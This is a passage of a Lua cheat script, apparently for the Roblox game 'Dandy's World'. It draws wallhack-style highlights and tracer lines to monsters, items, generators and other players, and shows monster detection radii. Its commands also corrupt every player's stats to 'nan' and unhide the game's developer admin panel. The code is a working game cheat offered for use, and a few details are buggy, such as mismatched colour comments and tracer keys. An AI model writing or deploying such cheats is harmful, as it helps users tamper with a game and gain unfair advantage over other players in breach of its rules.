										local monsterName = monsterString.Value
										if monsterName == "RazzleDazzleMonster" then
											if simpleesp then 
												monsterName = "R&D"
											else 
												monsterName = "Razzle & Dazzle"
											end
										end

										monsterName = monsterName:gsub("Monster", "")
										monsterName = monsterName:match("^%s*(.-)%s*$")

										if simpleesp then
											return "T. " .. monsterName
										else
											return "Twisted " .. monsterName
										end
									end
								end
								return nil
							end

							local monsterName = fetchMonsterName()
							if not monsterName then
								task.delay(0.1, function()
									monsterName = fetchMonsterName()
									if monsterName then
										displayText = simpleesp and "Capsule" or "Research Capsule (" .. monsterName .. ")"
										if item:FindFirstChild("EspBillboardGUIName") then
											local billboard = item.EspBillboardGUIName:FindFirstChildOfClass("TextLabel")
											if billboard then
												billboard.Text = displayText
											end
										end
									end
								end)
							else
								displayText = simpleesp and "Capsule" or "Research Capsule (" .. monsterName .. ")"
							end
						end

						-- Format item name with spacing
						for i = 1, #item.Name do
							local char = item.Name:sub(i, i)
							if char:match("%u") and i > 1 then
								formattedText = formattedText .. " " .. char
							else
								formattedText = formattedText .. char
							end
						end

						if item.Name ~= "ResearchCapsule" then
							displayText = formattedText
						end

						if item.Name == "RazzleDazzle" then
							displayText = simpleesp and "R&D" or "Razzle & Dazzle"
						elseif item.Name == "HolidayCollectibleItem" or item.Name == "Holiday Collectible Item" then
							displayText = "Basket"
						end

						-- Handle specific Research Capsule names
						local shouldTween = false
						if displayText == "Research Capsule (Twisted Eggson)" or
							displayText == "Research Capsule (Twisted Cocoa)" or
							displayText == "Research Capsule (Twisted Bassie)" or
							displayText == "Research Capsule (Twisted Flyte)" then
							shouldTween = true
						end

						-- Set highlight and billboard GUI
						if item.Name == "FakeCapsule" then
							highlight.FillColor = Color3.fromRGB(255, 255, 0)
							createBillboardGui(item, displayText, Color3.fromRGB(255, 255, 0))
						elseif item.Name == "HealthKit" or item.Name == "Bandage" then
							highlight.FillColor = Color3.fromRGB(176, 38, 255)
							createBillboardGui(item, displayText, Color3.fromRGB(176, 38, 255))
						elseif item.Name == "JumperCable" or item.Name == "Valve" then
							highlight.FillColor = Color3.fromRGB(255, 100, 0)
							createBillboardGui(item, displayText, Color3.fromRGB(255, 100, 0))
						elseif item.Name == "HolidayCollectibleItem" or item.Name == "Holiday Collectible Item" or item.Name == "Basket" then
							spawn(function() tweenItemColors(item) end)
							highlight.FillColor = Color3.fromRGB(140, 255, 140)
							createBillboardGui(item, displayText, Color3.fromRGB(140, 255, 140))
						elseif shouldTween then
							spawn(function() tweenItemColors(item) end)
							highlight.FillColor = Color3.fromRGB(140, 255, 140)
							createBillboardGui(item, displayText, Color3.fromRGB(140, 255, 140))
						else
							highlight.FillColor = Color3.fromRGB(0, 255, 0)
							createBillboardGui(item, displayText, Color3.fromRGB(0, 255, 0))
						end


						highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
						highlight.Enabled = highlightVisible
						highlight.Parent = item
					end
				end
			end
		end
	end

	-- Player highlighting
	if highlightTypes.Players then
		for _, player in pairs(noxious["players"]:GetPlayers()) do
			if player ~= noxious["local player"] and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local highlight = player.Character:FindFirstChildOfClass("Highlight")
				if not highlight then
					highlight = Instance.new("Highlight")
					-- Safe color assignment
					highlight.FillColor = getHighlightColor("Player")
					highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
					highlight.Enabled = highlightVisible
					highlight.Parent = player.Character

					local billboardText
					-- Billboard text logic (same as before)
					if table.find(noxious["unable"], player.Name:lower()) then
						if simpleesp == true then
							billboardText = "unable"
						else
							billboardText = "(@unable)\nunable"
						end
					elseif table.find(noxious["undercover unable"], player.Name:lower()) then
						if simpleesp == true then
							billboardText = "ncts"
						else
							billboardText = "(@ncts)\nncts"
						end
					elseif table.find(noxious["cosmo orbiter"], player.Name:lower()) then
						if simpleesp == true then
							billboardText = "Cosmo"
						else
							billboardText = "(@cosmo)\nCosmo"
						end
					elseif table.find(noxious["ace"], player.Name:lower()) then
						if simpleesp == true then
							billboardText = "Ace"
						else
							billboardText = "(@ace)\nAce"
						end
					else
						if simpleesp == true then
							billboardText = player.DisplayName
						else
							billboardText = "(@" .. player.Name .. ")\n" .. player.DisplayName
						end
					end

					createBillboardGui(player.Character, billboardText, getHighlightColor("Player"))
				end
			end
		end
	end

	local function roundToInteger(num)
		return math.floor(num + 0.5)
	end

	-- Machine highlighting
	if highlightTypes.Machines and currentRoom then
		for _, model in pairs(currentRoom:GetChildren()) do
			local generatorsFolder = model:FindFirstChild("Generators")                
			if generatorsFolder then
				for _, generator in pairs(generatorsFolder:GetChildren()) do
					if generator:IsA("Model") and not generator:FindFirstChildOfClass("Highlight") then
						local highlight = Instance.new("Highlight")                            
						local textColor = getHighlightColor("Machine")
						local fillColor = getHighlightColor("Machine")
						local statsFolder = generator:FindFirstChild("Stats")                            
						local completed = statsFolder and statsFolder:FindFirstChild("Completed")                            
						local currentAmount = statsFolder and statsFolder:FindFirstChild("CurrentAmount")                            
						local requiredAmount = statsFolder and statsFolder:FindFirstChild("RequiredAmount")                            
						local connie = statsFolder and statsFolder:FindFirstChild("Connie")

						local function updateGeneratorAppearance()
							if connie and connie.Value == true then
								fillColor = getHighlightColor("PosessedMachine")
								textColor = getHighlightColor("PosessedMachine")
							elseif completed and completed.Value == true then
								fillColor = getHighlightColor("CompletedMachine")
								textColor = getHighlightColor("CompletedMachine")
							else
								fillColor = getHighlightColor("Machine")
								textColor = getHighlightColor("Machine")
							end

							highlight.FillColor = fillColor
							local billboard = generator:FindFirstChild("EspBillboardGUIName")                                
							if billboard then
								local label = billboard:FindFirstChildOfClass("TextLabel")                                    
								if label then
									label.TextColor3 = textColor
									local generatorName = generator.Name
									if connie and connie.Value == true then
										generatorName = generatorName .. " (Possessed)"
									end
									label.Text = generatorName .. "\n(" .. (currentAmount and roundToInteger(currentAmount.Value) or 0) .. " / " .. (requiredAmount and requiredAmount.Value or 0) .. ")"
								end
							end
						end

						updateGeneratorAppearance()

						-- Connect change events (same as before)
						if connie then
							connie:GetPropertyChangedSignal("Value"):Connect(updateGeneratorAppearance)
						end

						if completed then
							completed:GetPropertyChangedSignal("Value"):Connect(updateGeneratorAppearance)
						end

						if currentAmount then
							currentAmount:GetPropertyChangedSignal("Value"):Connect(updateGeneratorAppearance)
						end

						if requiredAmount then
							requiredAmount:GetPropertyChangedSignal("Value"):Connect(updateGeneratorAppearance)
						end

						highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
						highlight.Enabled = highlightVisible
						highlight.Parent = generator

						createBillboardGui(generator, generator.Name, textColor, {
							CurrentAmount = currentAmount and roundToInteger(currentAmount.Value) or 0,
							RequiredAmount = requiredAmount and requiredAmount.Value or 0
						})
					end
				end
			end
		end
	end
end

function removeHighlights()
	local currentRoom = workspace:FindFirstChild"CurrentRoom"

	if currentRoom then
		for _, model in pairs(currentRoom:GetChildren()) do
			-- Remove highlights for Monsters, Items, and Generators
			for _, folderName in pairs{"Monsters", "Items", "Generators"} do
				local folder = model:FindFirstChild(folderName)
				if folder then
					for _, obj in pairs(folder:GetChildren()) do
						local highlight = obj:FindFirstChildOfClass"Highlight"							
						if highlight then
							highlight:Destroy()
						end
						local billboard = obj:FindFirstChild"EspBillboardGUIName"							
						if billboard then
							billboard:Destroy()
						end
					end
				end
			end

			-- Remove highlights for FakeElevator
			local freeArea = model:FindFirstChild("FreeArea")
			if freeArea then
				local fakeElevator = freeArea:FindFirstChild("FakeElevator")
				if fakeElevator and fakeElevator:IsA("Model") then
					local highlight = fakeElevator:FindFirstChildOfClass"Highlight"
					if highlight then
						highlight:Destroy()
					end
					local billboard = fakeElevator:FindFirstChild"EspBillboardGUIName"
					if billboard then
						billboard:Destroy()
					end
				end
			end
		end
	end

	-- Remove highlights for Players
	for _, player in pairs(noxious["players"]:GetPlayers()) do
		if player.Character then
			local highlight = player.Character:FindFirstChildOfClass"Highlight"				
			if highlight then
				highlight:Destroy()
			end
			local billboard = player.Character:FindFirstChild"EspBillboardGUIName"				
			if billboard then
				billboard:Destroy()
			end
		end
	end
end

function startHighlightLoop()
	if highlightLoopRunning then return end
	highlightLoopRunning = true

	noxious["run service"].Stepped:Connect(function()
		if highlightLoopRunning then
			addHighlights()
		end
	end)
end

function stopHighlightLoop()
	highlightLoopRunning = false
	removeHighlights()
end

function enableEsp(type)
	highlightTypes[type] = true
	startHighlightLoop()
end

function disableEsp(type)
	highlightTypes[type] = false

	local allDisabled = true
	for _, isEnabled in pairs(highlightTypes) do
		if isEnabled then
			allDisabled = false
			break
		end
	end

	if allDisabled then
		stopHighlightLoop()
	else
		removeHighlights()
	end
end

addcommand("hideesptext", "hespt", function()
	toggleBillboardTextVisibility(false)
	toggleHighlightVisibility(true)
end)

addcommand("showesptext", "sespt", function()
	toggleBillboardTextVisibility(true)
	if toggleHighlightVisibility(true) then
		toggleBillboardTextVisibility(false)
	end
end)

addcommand("hideesphighighlights", "hesph", function()
	toggleHighlightVisibility(false)
	toggleBillboardTextVisibility(true)
end)

addcommand("showesphighighlights", "sesph", function()
	toggleHighlightVisibility(true)
	if toggleBillboardTextVisibility(true) then
		toggleHighlightVisibility(false)
	end
end)

addcommand("enableallesp", "eaesp", function()
	for type in pairs(highlightTypes) do
		highlightTypes[type] = true
	end
	startHighlightLoop()
end)

addcommand("disableallesp", "daesp", function()
	for type in pairs(highlightTypes) do
		highlightTypes[type] = false
	end
	stopHighlightLoop()
end)

addcommand("enableplayeresp", "epesp", function()
	enableEsp("Players")
end)

addcommand("disableplayeresp", "dpesp", function()
	disableEsp("Players")
end)

addcommand("enablemachineesp", "emesp", function()
	enableEsp("Machines")
end)

addcommand("disablemachineesp", "dmesp", function()
	disableEsp("Machines")
end)

addcommand("enabletwistedesp", "etesp", function()
	enableEsp("Monsters")
end)

addcommand("disabletwistedesp", "dtesp", function()
	disableEsp("Monsters")
end)

addcommand("enableitemesp", "eiesp", function()
	enableEsp("Items")
end)

addcommand("disableitemesp", "diesp", function()
	disableEsp("Items")
end)

addcommand("enablefakeelevatoresp", "efeesp", function()
	enableEsp("FakeElevator")
end)

addcommand("disablefakeelevatoresp", "dfeesp", function()
	disableEsp("FakeElevator")
end)








local tracerTypes = {
	Players = true,
	Monsters = true,
	Items = true,
	Machines = true,
	FakeElevator = true
}

-- Tracer Settings
local tracerEnabled = true
local tracerGui = nil
local tracerLines = {}
local tracerLastUpdate = 0
local updateInterval = 0.01

-- Function to get model center
function getModelCenter(model)
	if not model or not model:IsA("Model") then return nil end

	local parts = {}
	for _, part in pairs(model:GetDescendants()) do
		if part:IsA("BasePart") then
			table.insert(parts, part)
		end
	end
	if #parts == 0 then return nil end

	local totalPosition = Vector3.new(0, 0, 0)
	for _, part in pairs(parts) do
		totalPosition = totalPosition + part.Position
	end
	return totalPosition / #parts
end

-- Function to set up tracer GUI
function setupTracerGui()
	if tracerGui then return end
	tracerGui = Instance.new("ScreenGui")
	tracerGui.Name = "TracerGui"
	tracerGui.ResetOnSpawn = false
	tracerGui.Parent = game.Players.LocalPlayer:FindFirstChild("PlayerGui") or game.Players.LocalPlayer:WaitForChild("PlayerGui")
end

-- Update the getHighlightColor function to match tween colors
function getHighlightColor2(type, monsterName, objectName)
	local tweenProgress = math.abs(math.sin(tick() * 1.3)) -- Oscillates between 0 and 1

	-- Special monsters (Group 1 - Red to Black)
	local redBlackMonsters = {"AstroMonster", "VeeMonster", "SproutMonster", "PebbleMonster", "ShellyMonster", "DandyMonster"}
	if monsterName and table.find(redBlackMonsters, monsterName) then
		return Color3.fromRGB(255, 0, 0):Lerp(Color3.fromRGB(0, 0, 0), tweenProgress)
	end

	-- Special monsters (Group 2 - Light Green to Light Pink)
	local eventMonsters = {"BassieMonster", "EggsonMonster", "FlyteMonster", "CocoaMonster"}
	if monsterName and table.find(eventMonsters, monsterName) then
		return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
	end

	-- Fake Elevator (Yellow to Black)
	if type == "FakeElevator" then
		return Color3.fromRGB(255, 255, 0):Lerp(Color3.fromRGB(0, 0, 0), tweenProgress)
	end

	-- Items that should use light green to light pink tween
	local tweenItems = {
		"HolidayCollectibleItem",
		"Holiday Collectible Item", 
		"Basket",
		"ResearchCapsule"
	}

	if objectName and table.find(tweenItems, objectName) then
		return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
	end

	-- Default cases
	if type == "Monster" then
		return Color3.new(1, 0, 0) -- Default red for other monsters
	elseif type == "FakeElevator" then
		return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
	elseif type == "Player" then
		return Color3.fromRGB(0, 162, 255) -- Blue for players
	elseif type == "Machine" then
		return Color3.fromRGB(150, 150, 150) -- Gray for machines
	elseif type == "PosessedMachine" then
		return Color3.fromRGB(0, 255, 255) -- Cyan for possessed
	elseif type == "CompletedMachine" then
		return Color3.fromRGB(255, 0, 255) -- Magenta for completed
	elseif type == "Heals" then
		return Color3.fromRGB(176, 38, 255) -- Purple for health items
	elseif type == "ExtractionItems" then
		return Color3.fromRGB(255, 100, 0) -- Orange for extraction items
	elseif type == "FakeCapsule" then
		return Color3.fromRGB(255, 255, 0) -- Yellow for fake capsules
	else
		return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress) -- Default tween
	end
end

-- Update the tracer color functions to use the same tween
function getGeneratorColor(generator)
	if not generator then return getHighlightColor("Machine") end
	local statsFolder = generator:FindFirstChild("Stats")
	if not statsFolder then return getHighlightColor("Machine") end

	local completed = statsFolder:FindFirstChild("Completed")
	local connie = statsFolder:FindFirstChild("Connie")

	if connie and connie.Value == true then
		return getHighlightColor("PosessedMachine")
	elseif completed and completed.Value == true then
		return getHighlightColor("CompletedMachine")
	else
		return getHighlightColor("Machine")
	end
end

-- Update the getHighlightColor function to match tween colors
function getItemColor(type, monsterName, objectName)
	local tweenProgress = math.abs(math.sin(tick() * 1.3)) -- Oscillates between 0 and 1

	-- Special monsters (Group 1 - Red to Black)
	local redBlackMonsters = {"AstroMonster", "VeeMonster", "SproutMonster", "PebbleMonster", "ShellyMonster", "DandyMonster"}
	if monsterName and table.find(redBlackMonsters, monsterName) then
		return Color3.fromRGB(255, 0, 0):Lerp(Color3.fromRGB(0, 0, 0), tweenProgress)
	end

	-- Special monsters (Group 2 - Light Green to Light Pink)
	local eventMonsters = {"BassieMonster", "EggsonMonster", "FlyteMonster", "CocoaMonster"}
	if monsterName and table.find(eventMonsters, monsterName) then
		return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
	end

	-- Fake Elevator (Yellow to Black)
	if type == "FakeElevator" then
		return Color3.fromRGB(255, 255, 0):Lerp(Color3.fromRGB(0, 0, 0), tweenProgress)
	end

	-- Items that should use light green to light pink tween
	local tweenItems = {
		"HolidayCollectibleItem",
		"Holiday Collectible Item", 
		"Basket"
	}

	-- Only apply tween to ResearchCapsule if it's from specific monsters
	if objectName == "ResearchCapsule" then
		local monsterName = fetchMonsterName()
		if monsterName and (
			string.find(monsterName, "Eggson") or
				string.find(monsterName, "Cocoa") or
				string.find(monsterName, "Bassie") or
				string.find(monsterName, "Flyte")
			) then
			return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
		else
			-- Default color for other ResearchCapsules
			return Color3.fromRGB(0, 0, 255) -- Orange like ExtractionItems
		end
	elseif objectName and table.find(tweenItems, objectName) then
		return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
	end

	-- Default cases
	if type == "Monster" then
		return Color3.new(1, 0, 0) -- Default red for other monsters
	elseif type == "FakeElevator" then
		return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
	elseif type == "Player" then
		return Color3.fromRGB(0, 162, 255) -- Blue for players
	elseif type == "Machine" then
		return Color3.fromRGB(150, 150, 150) -- Gray for machines
	elseif type == "PosessedMachine" then
		return Color3.fromRGB(0, 255, 255) -- Cyan for possessed
	elseif type == "CompletedMachine" then
		return Color3.fromRGB(255, 0, 255) -- Magenta for completed
	elseif type == "Heals" then
		return Color3.fromRGB(176, 38, 255) -- Purple for health items
	elseif type == "ExtractionItems" then
		return Color3.fromRGB(255, 100, 0) -- Orange for extraction items
	elseif type == "FakeCapsule" then
		return Color3.fromRGB(255, 255, 0) -- Yellow for fake capsules
	else
		return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress) -- Default tween
	end
end

-- Update the updateTracers function to use these color functions



























function updateTracers()
	local currentRoom = workspace:FindFirstChild("CurrentRoom")
	if tick() - tracerLastUpdate < updateInterval then return end
	tracerLastUpdate = tick()

	if not tracerEnabled then return end
	setupTracerGui()

	local targets = {}

	-- Add players (only target game.Players.Players)
	if tracerTypes.Players then
		for _, player in pairs(game.Players:GetPlayers()) do
			if player ~= game.Players.LocalPlayer then
				local character = player.Character
				if character then
					local center = getModelCenter(character)
					if center then
						local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
						if onScreen then
							table.insert(targets, {
								position = Vector2.new(screenPoint.X, screenPoint.Y),
								color = getHighlightColor2("Player") -- Blue for players
							})
						end
					end
				end
			end
		end
	end

	-- Monsters with all special cases preserved
	if tracerTypes.Monsters and currentRoom then
		for _, model in pairs(currentRoom:GetChildren()) do
			local monstersFolder = model:FindFirstChild("Monsters")
			if monstersFolder then
				for _, monster in pairs(monstersFolder:GetChildren()) do
					if monster:IsA("Model") then
						local center = getModelCenter(monster)
						if center then
							local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
							if onScreen then
								local color
								local monsterName = monster.Name

								-- Group 1: Red to Black monsters
								if table.find({"AstroMonster", "VeeMonster", "SproutMonster", "PebbleMonster", "ShellyMonster", "DandyMonster"}, monsterName) then
									local tweenProgress = math.abs(math.sin(tick() * 1.3))
									color = Color3.fromRGB(255, 0, 0):Lerp(Color3.fromRGB(0, 0, 0), tweenProgress)

									-- Group 2: Light Green to Light Pink monsters
								elseif table.find({"BassieMonster", "EggsonMonster", "FlyteMonster", "CocoaMonster"}, monsterName) then
									local tweenProgress = math.abs(math.sin(tick() * 1.3))
									color = Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)

									-- Default monster color
								else
									color = Color3.new(1, 0, 0) -- Solid red
								end

								table.insert(targets, {
									position = Vector2.new(screenPoint.X, screenPoint.Y),
									color = color
								})
							end
						end
					end
				end
			end
		end
	end

	function getItemColor(item)
		if not item then 
			local tweenProgress = math.abs(math.sin(tick() * 1.4))
			return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
		end

		local tweenItems = {
			"HolidayCollectibleItem",
			"Holiday Collectible Item",
			"Basket",
		}

		-- Check if it's a ResearchCapsule with specific monsters
		if item.Name == "ResearchCapsule" then
			local prompt = item:FindFirstChild("Prompt")
			if prompt then
				local monsterString = prompt:FindFirstChild("Monster")
				if monsterString and monsterString:IsA("StringValue") then
					local monsterName = monsterString.Value
					monsterName = monsterName:gsub("Monster", ""):match("^%s*(.-)%s*$") -- Clean it up

					if monsterName == "Eggson" or monsterName == "Cocoa" or monsterName == "Bassie" or monsterName == "Flyte" then
						local tweenProgress = math.abs(math.sin(tick() * 1.4))
						return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
					end
				end
			end
		end

		-- Normal tweened items
		if table.find(tweenItems, item.Name) then
			local tweenProgress = math.abs(math.sin(tick() * 1.4))
			return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
		end

		-- Static colored items
		local itemColors = {
			FakeCapsule = Color3.fromRGB(255, 255, 0), -- Yellow
			HealthKit = Color3.fromRGB(176, 38, 255), -- Purple
			Bandage = Color3.fromRGB(176, 38, 255), -- Purple
			JumperCable = Color3.fromRGB(255, 100, 0), -- Orange
			Valve = Color3.fromRGB(255, 100, 0) -- Orange
		}

		return itemColors[item.Name] or Color3.fromRGB(0, 255, 0) -- Default green
	end

	-- Updated item tracer section to use getItemColor
	if tracerTypes.Items and currentRoom then
		for _, model in pairs(currentRoom:GetChildren()) do
			local itemsFolder = model:FindFirstChild("Items")
			if itemsFolder then
				for _, item in pairs(itemsFolder:GetChildren()) do
					if item:IsA("Model") then
						local center = getModelCenter(item)
						if center then
							local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
							if onScreen then
								-- This will now return the exact same tween colors as the highlights
								table.insert(targets, {
									position = Vector2.new(screenPoint.X, screenPoint.Y),
									color = getItemColor(item)
								})
							end
						end
					end
				end
			end
		end
	end

	-- Add machines (generators) from CurrentRoom.Generators folder
	if tracerTypes.Machines and currentRoom then
		for _, model in pairs(currentRoom:GetChildren()) do
			local generatorsFolder = model:FindFirstChild("Generators")
			if generatorsFolder then
				for _, generator in pairs(generatorsFolder:GetChildren()) do
					if generator:IsA("Model") then
						local center = getModelCenter(generator)
						if center then
							local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
							if onScreen then
								local color = getGeneratorColor(generator) -- Get generator-specific color
								table.insert(targets, {
									position = Vector2.new(screenPoint.X, screenPoint.Y),
									color = color
								})
							end
						end
					end
				end
			end
		end
	end

	-- Fake Elevator (now with yellow to black tween)
	if tracerTypes.FakeElevator and currentRoom then
		for _, model in pairs(currentRoom:GetChildren()) do
			local freeArea = model:FindFirstChild("FreeArea")
			if freeArea then
				local fakeElevator = freeArea:FindFirstChild("FakeElevator")
				if fakeElevator and fakeElevator:IsA("Model") then
					local center = getModelCenter(fakeElevator)
					if center then
						local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
						if onScreen then
							local tweenProgress = math.abs(math.sin(tick() * 1.4))
							local color = Color3.fromRGB(255, 255, 0):Lerp(Color3.fromRGB(0, 0, 0), tweenProgress)
							table.insert(targets, {
								position = Vector2.new(screenPoint.X, screenPoint.Y),
								color = color
							})
						end
					end
				end
			end
		end
	end

	if #targets > #tracerLines then
		for i = #tracerLines + 1, #targets do
			local line = Instance.new("Frame")
			line.Name = "TracerLine"
			line.AnchorPoint = Vector2.new(0.5, 0.5)
			line.BackgroundTransparency = 0.3
			line.BackgroundColor3 = Color3.new(1, 1, 1)
			line.BorderSizePixel = 1
			line.BorderColor3 = Color3.new(1, 1, 1)
			line.Parent = tracerGui
			table.insert(tracerLines, line)
		end
	end

	-- Update existing lines
	for i, line in pairs(tracerLines) do
		local target = targets[i]
		if not target then
			line:Destroy()
			table.remove(tracerLines, i)
		else
			local origin = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y * 0.9)
			local destination = target.position

			local position = (origin + destination) / 2
			line.Position = UDim2.new(0, position.X, 0, position.Y)

			local length = (origin - destination).Magnitude
			line.Size = UDim2.new(0, length, 0, 1) -- Line width

			line.Rotation = math.deg(math.atan2(destination.Y - origin.Y, destination.X - origin.X))
			line.BackgroundColor3 = target.color

			line.BackgroundTransparency = 0.3 -- Reset to default transparency
		end
	end
end

-- Function to enable tracers
function enableTracer(type)
	if tracerTypes[type] ~= nil then
		tracerTypes[type] = true
		tracerEnabled = true
	end
end

-- Function to disable tracers
function disableTracer(type)
	if tracerTypes[type] ~= nil then
		tracerTypes[type] = false
	end
end

-- Function to toggle tracers
function toggleTracers(enabled)
	tracerEnabled = enabled
	if not enabled then
		for _, line in pairs(tracerLines) do
			line:Destroy()
		end
		tracerLines = {}
	end
end

-- Connect to RenderStepped to update tracers every frame (with optimized update rate)
noxious["run service"].Heartbeat:Connect(updateTracers)

function disablealltracers()
	toggleTracers(false)
	disableTracer("Monsters")
	disableTracer("FakeElevator")
	disableTracer("Machines")
	disableTracer("Items")
	disableTracer("Players")
end

function enablealltracers()
	toggleTracers(true)
	enableTracer("Monsters")
	enableTracer("FakeElevator")
	enableTracer("Machines")
	enableTracer("Items")
	enableTracer("Players")
end

disablealltracers()

addcommand("enablealltracers", "eat", function()
	enablealltracers()
end)

addcommand("disablealltracers", "dat", function()
	disablealltracers()
end)

addcommand("enableplayertracers", "ept", function()
	enableTracer("Players")
end)

addcommand("disableplayertracers", "dpt", function()
	disableTracer("Players")
end)

addcommand("enablemachinetracers", "emt", function()
	enableTracer("Machines")
end)

addcommand("disablemachinetracers", "dmt", function()
	disableTracer("Machines")
end)

addcommand("enabletwistedtracers", "ett", function()
	enableTracer("Monsters")
end)

addcommand("disabletwistedtracers", "dtt", function()
	disableTracer("Monsters")
end)

addcommand("enableitemtracers", "eit", function()
	enableTracer("Item")
end)

addcommand("disableitemtracers", "dit", function()
	disableTracer("Item")
end)

addcommand("enablefakeelevatortracers", "efet", function()
	enableTracer("FakeElevator")
end)

addcommand("disablefakeelevatortracers", "dfet", function()
	disableTracer("FakeElevator")
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("breakstats", "bstats", function()
	local inGamePlayersFolder = game.Workspace:FindFirstChild"InGamePlayers"

	if inGamePlayersFolder then
		for _, playerFolder in pairs(inGamePlayersFolder:GetChildren()) do
			local statsFolder = playerFolder:FindFirstChild"Stats"

			if statsFolder then
				for _, stat in pairs(statsFolder:GetChildren()) do
					if stat:IsA"NumberValue"then
						stat.Value = "nan"
					end
				end
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("showadminpanel", "sap", function()
	if game.PlaceId == noxious["dandy's world lobby"] then

		local devframe = game.ReplicatedStorage.Admin.DevFrame
		devframe.Frame.Visible = true
		devframe.Frame.Parent = game.Players.LocalPlayer.PlayerGui.MainGui
	end

	if game.PlaceId == noxious["dandy's world run"] then

		local function showgui(parent)
			for _, child in ipairs(parent:GetChildren()) do
				if child:IsA"GuiObject"then
					child.Visible = true
				end
				showgui(child)
			end
		end

		if noxious["local player"] and noxious["local player"]:FindFirstChild"PlayerGui"then
			for _, screenGui in ipairs(noxious["local player"].PlayerGui:GetChildren()) do
				if screenGui:IsA"ScreenGui"then
					local devFrame = screenGui:FindFirstChild"DevFrame"						
					if devFrame and devFrame:IsA"Frame"then
						devFrame.Visible = true
						showgui(devFrame)
					end
				end
			end
		end
	end
end)

addcommand("hideadminpanel", "hap", function()
	if game.PlaceId == noxious["dandy's world lobby"] then

		local devframe = game.Players.LocalPlayer.PlayerGui.MainGui
		devframe.Frame.Visible = false
		devframe.Frame.Parent = game.ReplicatedStorage.Admin.DevFrame
	end

	if game.PlaceId == noxious["dandy's world run"] then

		local function hidegui(parent)
			for _, child in ipairs(parent:GetChildren()) do
				if child:IsA"GuiObject"then
					child.Visible = false
				end
				hidegui(child)
			end
		end

		if noxious["local player"] and noxious["local player"]:FindFirstChild"PlayerGui"then
			for _, screenGui in ipairs(noxious["local player"].PlayerGui:GetChildren()) do
				if screenGui:IsA"ScreenGui"then
					local devFrame = screenGui:FindFirstChild"DevFrame"						
					if devFrame and devFrame:IsA"Frame"then
						devFrame.Visible = false
						hidegui(devFrame)
					end
				end
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("showdiscardedgui", "sdg", function()
	local selectionFrame2 = noxious["local player"].PlayerGui.ScreenGui:FindFirstChild("SelectionFrame2")

	if selectionFrame2 then
		selectionFrame2.Visible = true
	end
end)

addcommand("hidediscardedgui", "hdg", function()
	local selectionFrame2 = noxious["local player"].PlayerGui.ScreenGui:FindFirstChild("SelectionFrame2")

	if selectionFrame2 then
		selectionFrame2.Visible = false
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local visualizervisibilitysettings = {
	KillRadius = true,
	InstantRadius = true,
	VisionRadius = true,
	HearingRadius = true
}

-- Store active monster visualizations
local activeVisualizations = {}

-- Function to create a sphere in Workspace
function createsphere(radius, color, name)
	local sphere = Instance.new("Part")
	sphere.Name = name
	sphere.Shape = Enum.PartType.Ball
	sphere.Size = Vector3.new(radius * 2, radius * 2, radius * 2)
	sphere.Transparency = 0
	sphere.Color = color
	sphere.Material = Enum.Material.ForceField
	sphere.CanCollide = false
	sphere.Anchored = true
	sphere.CastShadow = false
	sphere.Parent = workspace
	return sphere
end

function getAnchorPart(monster)
	return monster:FindFirstChild("HumanoidRootPart") 
		or monster.PrimaryPart 
		or monster:FindFirstChildWhichIsA("BasePart")
end

function updsv(monster)
	local visData = activeVisualizations[monster]
	if not visData then return end

	for radiusType, sphere in pairs(visData.spheres) do
		if visualizervisibilitysettings[radiusType] ~= nil then
			sphere.Transparency = visualizervisibilitysettings[radiusType] and 0 or 1
		end
	end
end

function showradius(radiusType)
	if visualizervisibilitysettings[radiusType] ~= nil then
		visualizervisibilitysettings[radiusType] = true
		for monster, _ in pairs(activeVisualizations) do
			if monster:IsDescendantOf(game) then
				updsv(monster)
			end
		end
		return true
	end
	return false
end

function hideRadius(radiusType)
	if visualizervisibilitysettings[radiusType] ~= nil then
		visualizervisibilitysettings[radiusType] = false
		for monster, _ in pairs(activeVisualizations) do
			if monster:IsDescendantOf(game) then
				updsv(monster)
			end
		end
		return true
	end
	return false
end

function cleanupVisualization(monster)
	local visData = activeVisualizations[monster]
	if visData then
		-- Disconnect all connections
		for _, conn in ipairs(visData.connections) do
			conn:Disconnect()
		end

		-- Destroy all spheres
		for _, sphere in pairs(visData.spheres) do
			sphere:Destroy()
		end

		activeVisualizations[monster] = nil
	end
end

function visualizemonsterradii(monster)
	-- Clean up any existing visualization first
	cleanupVisualization(monster)

	local chaser = monster:FindFirstChild("Chaser")
	if not chaser then return end

	local killRadius = chaser:FindFirstChild("KillRadius")
	local instantRadius = chaser:FindFirstChild("InstantRadius")
